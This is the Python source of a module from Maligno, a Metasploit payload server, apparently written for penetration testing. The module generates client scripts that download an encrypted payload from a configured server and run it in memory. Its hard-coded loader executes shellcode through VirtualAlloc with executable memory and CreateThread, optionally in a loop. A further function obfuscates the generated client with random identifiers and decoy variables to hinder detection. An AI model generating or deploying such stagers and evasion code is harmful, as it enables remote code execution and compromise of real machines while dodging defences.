#!/usr/bin/python

################################################################
#                                                              #
# Maligno - A Metasploit payload server                        #
# written by Juan J. Guelfo @ Encripto AS                      #
# post@encripto.no                                             #
#                                                              #
# Copyright 2013-2015 Encripto AS. All rights reserved.        #
#                                                              #
# Maligno is licensed under the FreeBSD license.               #
# http://www.freebsd.org/copyright/freebsd-license.html        #
#                                                              #
################################################################


import os, sys, getopt, string, random, urllib, malout


def get_client_template(template_file):
    try:
        fr = open(template_file, 'r')
        content = fr.read().splitlines()
        fr.close()

    except IOError:
        malout.print_error("Could not find %s." % template_file)
        sys.exit()

    return content


def generate_client_code(server_config, profile_request_config, profile_response_config, profile_network_config, profile_client_config, profile_client_header_config, client_template, msfpayload, package, standalone):
    client_code = []
    get_caught_mode = False
    if int(profile_network_config["getcaught"]) > 1:
        get_caught_mode = True

    for template_line in client_template:
        if template_line == "<CONFIG>":
            req_prefix = ""
            req_suffix = ""
            resp_prefix = ""
            resp_suffix = ""
            try:
                req_prefix = urllib.unquote(profile_request_config["prefix"])
            except KeyError:
                pass

            try:
                req_suffix = urllib.unquote(profile_request_config["suffix"])
            except KeyError:
                pass

            try:
                resp_prefix = urllib.unquote(profile_response_config["prefix"])
            except KeyError:
                pass

            try:
                resp_suffix = urllib.unquote(profile_response_config["suffix"])
            except KeyError:
                pass

            client_code.append("cfg_encoding_method = \"" + profile_network_config["encoding"] + "\"")
            client_code.append("cfg_encoding_rounds = " + profile_network_config["rounds"] + "")
            client_code.append("cfg_secret = \"" + profile_network_config["secret"] + "\"")
            client_code.append("cfg_http_method = \"" + profile_request_config["method"] + "\"")
            client_code.append("cfg_req_page = \"" + profile_request_config["page"] + "\"")
            client_code.append("cfg_req_param = \"" + profile_request_config["parameter"] + "\"")
            client_code.append("cfg_param_location = \"" + profile_request_config["location"] + "\"")
            client_code.append("cfg_req_prefix = \"" + req_prefix + "\"")
            client_code.append("cfg_req_suffix = \"" + req_suffix + "\"")
            client_code.append("cfg_resp_prefix = \"" + resp_prefix + "\"")
            client_code.append("cfg_resp_suffix = \"" + resp_suffix + "\"")
            client_code.append("cfg_payload_id = \"" + str(msfpayload["id"]) + "\"")
            client_code.append("cfg_max_nap_time = " + profile_client_config["maxnaptime"] + "")
            client_code.append("cfg_server_addr = \"" + server_config["addr"] + "\"")
            client_code.append("cfg_server_port = \"" + server_config["port"] + "\"")
            client_code.append("cfg_get_caught = " + str(profile_network_config["getcaught"]) + "")
            client_code.append("cfg_req_delay = " + str(profile_network_config["reqdelay"]) + "")

            if profile_response_config["protocol"].upper() == "HTTP/1.0":
                client_code.append("cfg_http_10 = True")
            else:
                client_code.append("cfg_http_10 = False")

            if server_config["ssl"].upper() in ["TRUE"]:
                client_code.append("cfg_ssl = True")
            else:
                client_code.append("cfg_ssl = False")

            if server_config["failsafe"].upper() in ["TRUE"]:
                client_code.append("cfg_failsafe = True")
            else:
                client_code.append("cfg_failsafe = False")

            code_line = "cfg_http_headers = [ "
            if profile_client_header_config:
                    header_count = 1
                    cookie_processed = False
                    for header in profile_client_header_config:
                        if header:
                            if str(header["field"]).rstrip().lstrip().upper() in ["COOKIE"] and profile_request_config["location"].upper() in ["COOKIE"]:
                                req_cookie = ""
                                if header["value"]:
                                    req_cookie += str(header["value"]).rstrip().lstrip()

                                if len(req_prefix) > 0:
                                    req_cookie += "; %s; " %(req_prefix)

                                req_cookie += "%s=%s" % (str(profile_request_config["parameter"]).rstrip().lstrip(), str(msfpayload["id"]).rstrip().lstrip())

                                if len(req_suffix) > 0:
                                    req_cookie += "; %s" % (req_suffix)

                                code_line += "{ \"field\":\"%s\", \"value\":\"%s\" }" % (str(header["field"]).rstrip().lstrip(), urllib.unquote(req_cookie))
                                cookie_processed = True

                            elif server_config["failsafe"].upper() in ["TRUE"] and str(header["field"]).rstrip().lstrip().upper() in ["CONTENT-MD5"]:
                                malout.print_error("Failsafe mode is enabled and it actively uses a Content-MD5 header.")
                                malout.print_error("Ignoring Content-MD5 client header...")

                            else:
                                code_line += "{ \"field\":\"%s\", \"value\":\"%s\" }" % (str(header["field"]).rstrip().lstrip(), str(header["value"]).rstrip().lstrip())

                            header_count += 1

                        else:
                            print "\n[-] There was a problem while parsing one of the client headers. Ingnoring it...\n"

                        if header_count <= len(profile_client_header_config):
                            code_line += ", "

                        else:
                            if profile_request_config["location"].upper() in ["COOKIE"] and not cookie_processed:
                                req_cookie = ""
                                if len(req_prefix) > 0:
                                    req_cookie += "%s; " %(req_prefix)

                                req_cookie += "%s=%s" % (str(profile_request_config["parameter"]).rstrip().lstrip(), str(msfpayload["id"]).rstrip().lstrip())

                                if len(req_suffix) > 0:
                                    req_cookie += "; %s" % (req_suffix)

                                code_line += ", { \"field\":\"Cookie\", \"value\":\"%s\" }" % (urllib.unquote(req_cookie))
            code_line += " ]"
            client_code.append(code_line)

        elif template_line == "        <CTEXT>":
            client_code.append("        m_ctext = \"" + package + "\"")

        elif template_line == "                <EXECUTION>":
            if not get_caught_mode or standalone:
                if msfpayload["payload"].find("python") > -1:
                    code_line = "                exec(base64.b64decode({2:str,3:lambda b:bytes(b,'UTF-8')}[sys.version_info[0]](m_shellcode)))"
                else:
                    if msfpayload["perpetual"].upper() in ["TRUE"]:
                        code_line = """                m_shellcode = m_shellcode.decode("string_escape")
                m_shellcode = bytearray(m_shellcode)
                while(1):
                    ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0), ctypes.c_int(len(m_shellcode)), ctypes.c_int(0x3000), ctypes.c_int(0x40))
                    ctypes.windll.kernel32.VirtualLock(ctypes.c_int(ptr), ctypes.c_int(len(m_shellcode)))
                    bff = (ctypes.c_char * len(m_shellcode)).from_buffer(m_shellcode)
                    ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr), bff, ctypes.c_int(len(m_shellcode)))
                    thread = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0), ctypes.c_int(0), ctypes.c_int(ptr), ctypes.c_int(0), ctypes.c_int(0), ctypes.pointer(ctypes.c_int(0)))
                    ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(thread),ctypes.c_int(-1))
                    sleep(30)"""
                    else:
                        code_line = """                m_shellcode = m_shellcode.decode("string_escape")
                m_shellcode = bytearray(m_shellcode)
                ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0), ctypes.c_int(len(m_shellcode)), ctypes.c_int(0x3000), ctypes.c_int(0x40))
                ctypes.windll.kernel32.VirtualLock(ctypes.c_int(ptr), ctypes.c_int(len(m_shellcode)))
                bff = (ctypes.c_char * len(m_shellcode)).from_buffer(m_shellcode)
                ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr), bff, ctypes.c_int(len(m_shellcode)))
                thread = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0), ctypes.c_int(0), ctypes.c_int(ptr), ctypes.c_int(0), ctypes.c_int(0), ctypes.pointer(ctypes.c_int(0)))
                ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(thread),ctypes.c_int(-1))"""

            else:
                code_line = "                pass"

            client_code.append(code_line)

        elif template_line.startswith("#"):
            continue

        else:
            client_code.append(template_line)

    return client_code


def generate_name(size=10, chars=string.ascii_uppercase +  string.ascii_lowercase):
    return ''.join(random.choice(chars) for _ in range(size))


def generate_extension():
    return random.choice(["aspx", "asp", "php", "html", "htm", "jsp", "nsf"])


def generate_encoding_type():
    return random.choice(["base64", "hex", "ascii", "plain"])


def obfuscate_client_code(client_code):

    table = {
            "__version__" : generate_name(random.randint(5,20)), "HTTP_PROXY" : generate_name(random.randint(5,20)), "cfg_failsafe" : generate_name(random.randint(5,20)),
            "cfg_encoding_method" : generate_name(random.randint(5,20)), "cfg_encoding_rounds" : generate_name(random.randint(5,20)), "cfg_secret" : generate_name(random.randint(5,20)),
            "cfg_http_method" : generate_name(random.randint(5,20)), "cfg_req_page" : generate_name(random.randint(5,20)), "cfg_req_param" : generate_name(random.randint(5,20)),
            "cfg_param_location" : generate_name(random.randint(5,20)), "cfg_req_prefix" : generate_name(random.randint(5,20)), "cfg_req_suffix" : generate_name(random.randint(5,20)),
            "cfg_resp_prefix" : generate_name(random.randint(5,20)), "cfg_resp_suffix" : generate_name(random.randint(5,20)), "cfg_payload_id" : generate_name(random.randint(5,20)),
            "cfg_max_nap_time" : generate_name(random.randint(5,20)), "cfg_server_addr" : generate_name(random.randint(5,20)), "cfg_server_port" : generate_name(random.randint(5,20)),
            "cfg_get_caught" : generate_name(random.randint(5,20)), "cfg_req_delay" : generate_name(random.randint(5,20)), "cfg_http_10" : generate_name(random.randint(5,20)),
            "cfg_ssl" : generate_name(random.randint(5,20)), "cfg_http_headers" : generate_name(random.randint(5,20)),"hrn_sspi_cli" : generate_name(random.randint(5,20)),
            "cfg_cipher" : generate_name(random.randint(5,20)), "cfg_total" : generate_name(random.randint(5,20)), "cfg_has_slept" : generate_name(random.randint(5,20)),
            "cfg_nap_time" : generate_name(random.randint(5,20)), "pack_data" : generate_name(random.randint(5,20)), "pd_data" : generate_name(random.randint(5,20)),
            "pd_block_size" : generate_name(random.randint(5,20)), "pd_padding_char" : generate_name(random.randint(5,20)), "pd_plaintext" : generate_name(random.randint(5,20)),
            "pd_padded" : generate_name(random.randint(5,20)), "pd_ctxt" : generate_name(random.randint(5,20)), "extract_wpad_proxy_list" : generate_name(random.randint(5,20)),
            "ewpl_wpad_result" : generate_name(random.randint(5,20)), "ewpl_proxy_list" : generate_name(random.randint(5,20)), "ewpl_resp_line" : generate_name(random.randint(5,20)),
            "ewpl_proxy_candidates" : generate_name(random.randint(5,20)), "ewpl_p_candidate" : generate_name(random.randint(5,20)), "http_request_ntlm" : generate_name(random.randint(5,20)),
            "hrn_http_conn" : generate_name(random.randint(5,20)), "hrn_request_url" : generate_name(random.randint(5,20)), "hrn_request_headers" : generate_name(random.randint(5,20)),
            "hrn_extra_headers" : generate_name(random.randint(5,20)), "hrn_response_status" : generate_name(random.randint(5,20)), "hrn_http_resp" : generate_name(random.randint(5,20)),
            "hrn_username" : generate_name(random.randint(5,20)), "hrn_error" : generate_name(random.randint(5,20)), "hrn_out_buf" : generate_name(random.randint(5,20)),
            "hrn_auth_data" : generate_name(random.randint(5,20)), "hrn_ntlm_challenge" : generate_name(random.randint(5,20)), "hrn_http_conn" : generate_name(random.randint(5,20)),
            "hrn_header_index" : generate_name(random.randint(5,20)), "hrn_response_headers" : generate_name(random.randint(5,20)), "hrn_ntlm_response" : generate_name(random.randint(5,20)),
            "hrn_header_index" : generate_name(random.randint(5,20)), "wpad_ntlm" : generate_name(random.randint(5,20)), "wn_proxy_addr" : generate_name(random.randint(5,20)),
            "wn_proxy_port" : generate_name(random.randint(5,20)), "wn_request_url" : generate_name(random.randint(5,20)), "wn_request_headers" : generate_name(random.randint(5,20)),
            "wn_extra_headers" : generate_name(random.randint(5,20)), "wn_response_status" : generate_name(random.randint(5,20)), "wn_proxy_list" : generate_name(random.randint(5,20)),
            "wn_http_conn" : generate_name(random.randint(5,20)), "wn_wpad_response" : generate_name(random.randint(5,20)), "wn_wpad_result" : generate_name(random.randint(5,20)),
            "proxy_autodiscover" : generate_name(random.randint(5,20)), "pa_request_headers" : generate_name(random.randint(5,20)), "pa_proxy_list" : generate_name(random.randint(5,20)),
            "pa_wpad_host" : generate_name(random.randint(5,20)), "pa_wpad_resource" : generate_name(random.randint(5,20)), "pa_extra_headers" : generate_name(random.randint(5,20)),
            "pa_www_authenticate_header" : generate_name(random.randint(5,20)), "pa_proxy_authenticate_header" : generate_name(random.randint(5,20)), "pa_http_conn" : generate_name(random.randint(5,20)),
            "pa_header_index" : generate_name(random.randint(5,20)), "pa_wpad_response" : generate_name(random.randint(5,20)), "pa_wpad_result" : generate_name(random.randint(5,20)),
            "pa_response_headers" : generate_name(random.randint(5,20)), "pa_ntlm_supported" : generate_name(random.randint(5,20)), "pa_m" : generate_name(random.randint(5,20)),
            "pa_response_status" : generate_name(random.randint(5,20)), "check_connectivity" : generate_name(random.randint(5,20)), "cc_p_candidate" : generate_name(random.randint(5,20)),
            "cc_request_headers" : generate_name(random.randint(5,20)), "cc_connectivity" : generate_name(random.randint(5,20)), "cc_request_url" : generate_name(random.randint(5,20)),
            "cc_request_host" : generate_name(random.randint(5,20)), "cc_extra_headers" : generate_name(random.randint(5,20)), "cc_www_authenticate_header" : generate_name(random.randint(5,20)),
            "cc_proxy_authenticate_header" : generate_name(random.randint(5,20)), "cc_proxy_addr" : generate_name(random.randint(5,20)), "cc_proxy_port" : generate_name(random.randint(5,20)),
            "cc_http_conn" : generate_name(random.randint(5,20)), "cc_header_index" : generate_name(random.randint(5,20)), "cc_http_resp" : generate_name(random.randint(5,20)),
            "cc_response_headers" : generate_name(random.randint(5,20)), "cc_ntlm_supported" : generate_name(random.randint(5,20)), "cc_m" : generate_name(random.randint(5,20)),
            "cc_response_status" : generate_name(random.randint(5,20)), "build_connection_with_proxy" : generate_name(random.randint(5,20)), "bcwp_server_addr" : generate_name(random.randint(5,20)),
            "bcwp_server_port" : generate_name(random.randint(5,20)), "bcwp_ssl" : generate_name(random.randint(5,20)), "bcwp_http_conn" : generate_name(random.randint(5,20)),
            "bcwp_proxy_enabled" : generate_name(random.randint(5,20)), "bcwp_proxy_addr" : generate_name(random.randint(5,20)), "bcwp_proxy_port" : generate_name(random.randint(5,20)),
            "bcwp_proxy_list" : generate_name(random.randint(5,20)), "bcwp_request_headers" : generate_name(random.randint(5,20)), "bcwp_tunnel_headers" : generate_name(random.randint(5,20)),
            "bcwp_p_candidate" : generate_name(random.randint(5,20)), "build_direct_connection" : generate_name(random.randint(5,20)), "bdc_server_addr" : generate_name(random.randint(5,20)),
            "bdc_server_port" : generate_name(random.randint(5,20)), "bdc_ssl" : generate_name(random.randint(5,20)), "bdc_http_conn" : generate_name(random.randint(5,20)),
            "download_payload" : generate_name(random.randint(5,20)), "dp_http_conn" : generate_name(random.randint(5,20)), "dp_http_method" : generate_name(random.randint(5,20)),
            "dp_http_headers" : generate_name(random.randint(5,20)), "dp_req_path" : generate_name(random.randint(5,20)), "dp_get_caught" : generate_name(random.randint(5,20)),
            "dp_req_delay" : generate_name(random.randint(5,20)), "dp_req_body" : generate_name(random.randint(5,20)), "dp_ctext" : generate_name(random.randint(5,20)),
            "dp_num_reqs" : generate_name(random.randint(5,20)), "dp_content_length_present" : generate_name(random.randint(5,20)), "dp_header_index" : generate_name(random.randint(5,20)),
            "dp_http_resp" : generate_name(random.randint(5,20)), "unpack_data" : generate_name(random.randint(5,20)), "ud_ctext" : generate_name(random.randint(5,20)),
            "ud_cipher" : generate_name(random.randint(5,20)), "ud_encoding_method" : generate_name(random.randint(5,20)), "ud_encoding_rounds" : generate_name(random.randint(5,20)),
            "ud_resp_prefix" : generate_name(random.randint(5,20)), "ud_resp_suffix" : generate_name(random.randint(5,20)), "ud_i" : generate_name(random.randint(5,20)),
            "ud_plaintext" : generate_name(random.randint(5,20)), "ud_padding_char" : generate_name(random.randint(5,20)), "ud_shellcode" : generate_name(random.randint(5,20)),
            "m_iteration" : generate_name(random.randint(5,20)), "m_ctext" : generate_name(random.randint(5,20)), "m_req_body" : generate_name(random.randint(5,20)),
            "m_http_conn" : generate_name(random.randint(5,20)), "m_req_path" : generate_name(random.randint(5,20)), "m_shellcode" : generate_name(random.randint(5,20)),
            "ptr" : generate_name(random.randint(5,20)), "bff" : generate_name(random.randint(5,20)), "thread" : generate_name(random.randint(5,20))
            }

    obfuscated_code = []
    for x in xrange(0, random.randint(5,20)):
        obfuscated_code.append("%s = %s" % (generate_name(random.randint(5,20)), str(random.randint(5,20))))

    reached = False
    for line in client_code:
        if line.startswith("def"):
            reached = True

        if not reached:
            for x in xrange(0, random.randint(0,10)):
                n = random.randint(0, 10000000)
                if n % 11 == 9:
                    obfuscated_code.append("%s = \"%s\"" % (generate_name(random.randint(5,20)), str(random.choice(["QUERYSTRING", "COOKIE", "BODY", "querystring", "cookie", "body"]))))

                elif n % 11 == 8:
                    obfuscated_code.append("%s = \"%s\"" % (generate_name(random.randint(5,20)), str(random.choice(["GET", "POST", "HEAD"]))))

                elif n % 11 == 7:
                    obfuscated_code.append("%s = \"%s.%s\"" % (generate_name(random.randint(5,20)), generate_name(random.randint(5,10)).lower(),
                                                               generate_extension().lower()))
                elif n % 11 == 6:
                    obfuscated_code.append("%s = \"%s\"" % (generate_name(random.randint(5,20)), generate_name(random.randint(1, 10))))

                elif n % 11 == 5:
                    obfuscated_code.append("%s = \"%s\"" % (generate_name(random.randint(5,20)), str(generate_name(32, string.hexdigits).lower())))

                elif n % 11 == 4:
                    obfuscated_code.append("%s = %s" % (generate_name(random.randint(5,20)), str(random.randint(5,20))))

                elif n % 11 == 3:
                    obfuscated_code.append("%s = \"%s\"" % (generate_name(random.randint(5,20)), str(random.randint(0,1024))))

                elif n % 11 == 2:
                    obfuscated_code.append("%s = \"%s\"" % (generate_name(random.randint(5,20)), str(random.choice(["True", "False"]))))

                elif n % 11 == 1:
                    obfuscated_code.append("%s = \"%s\"" % (generate_name(random.randint(5,20)), generate_encoding_type().lower()))

                else:
                    obfuscated_code.append("%s = \"%s.%s.%s.%s\"" %
                    (generate_name(random.randint(5,20)), str(random.randrange(0, 255, 1)), str(random.randrange(0, 255, 1)), str(random.randrange(0, 255, 1)), str(random.randrange(0, 255, 1))))

        for key, value in table.iteritems():
            line = line.replace(key, value, 999)

        if len(line) > 0:
            obfuscated_code.append(line)

    return obfuscated_code


def generate_client_file(script_code, output_file):
    try:
        fw = open(output_file, 'w')
        fw.write("#!/usr/bin/python\n")

        for line in script_code:
            fw.write(line + "\n")

        fw.close()
        malout.print_ok("Client file \"%s\" successfully written!\n" % output_file)

    except IOError:
        malout.print_error("Could not save client code in %s.\n" %  output_file)

    return